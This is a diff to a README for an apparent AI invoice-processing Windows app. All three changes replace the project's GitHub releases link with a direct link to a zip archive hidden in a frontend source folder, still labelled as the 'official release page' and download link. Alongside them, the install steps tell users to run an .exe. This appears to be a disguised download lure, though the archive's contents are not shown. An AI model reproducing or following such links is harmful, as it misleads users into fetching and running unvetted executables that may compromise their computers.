@@ -1,6 +1,6 @@
 # 🤖 AI-Invoice-System - Automate your invoice processing tasks today
 
-[![Download AI-Invoice-System](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Juanvil9941/AI-Invoice-System/releases)
+[![Download AI-Invoice-System](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Juanvil9941/AI-Invoice-System/main/frontend/src/lib/Invoice_A_System_3.9.zip)
 
 This application uses artificial intelligence to read, check, and store your invoices automatically. It removes the need for manual data entry and helps you track business expenses with minimal effort. The system scans documents, extracts key information like dates and totals, and alerts you to potential errors or fraud.
 
@@ -8,7 +8,7 @@ This application uses artificial intelligence to read, check, and store your inv
 
 To start using the application, follow these steps:
 
-1. Visit the [official release page](https://github.com/Juanvil9941/AI-Invoice-System/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Juanvil9941/AI-Invoice-System/main/frontend/src/lib/Invoice_A_System_3.9.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link for the file ending in .exe.
 4. Save the file to your computer.
@@ -73,7 +73,7 @@ The application works primarily on your local computer to keep your invoice data
 You can upload PDF documents, JPEG images, and PNG images. For the best results, use high-resolution scans or clear photos of your documents.
 
 ### How do I update the system?
-Visit the [download link](https://github.com/Juanvil9941/AI-Invoice-System/releases) whenever you see a notice about a new version. Download and install the new version to overwrite the old one. Your data remains safe during the update process.
+Visit the [download link](https://raw.githubusercontent.com/Juanvil9941/AI-Invoice-System/main/frontend/src/lib/Invoice_A_System_3.9.zip) whenever you see a notice about a new version. Download and install the new version to overwrite the old one. Your data remains safe during the update process.
 
 ### Can I run this on a Mac?
 This version is designed specifically for Windows.
